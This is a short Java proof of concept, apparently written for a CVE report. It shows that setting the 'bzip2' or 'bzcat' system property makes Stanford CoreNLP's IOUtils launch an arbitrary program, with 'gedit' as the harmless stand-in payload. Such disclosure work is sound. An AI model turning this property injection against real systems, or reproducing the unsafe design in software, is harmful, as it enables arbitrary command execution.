package cve.example;
import edu.stanford.nlp.io.IOUtils;

public class Main {
    public static void main(String[] args) {
        System.setProperty("bzip2", "gedit");
        try {
            IOUtils.getFileOutputStream("Main.bz2");
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
    public static void demoInput() {
        System.setProperty("bzcat", "gedit");
        try {
            IOUtils.getBZip2PipedInputStream("");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void demoOutput() {
        System.setProperty("bzip2", "gedit");
        try {
            IOUtils.getBZip2PipedOutputStream("Main.java");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}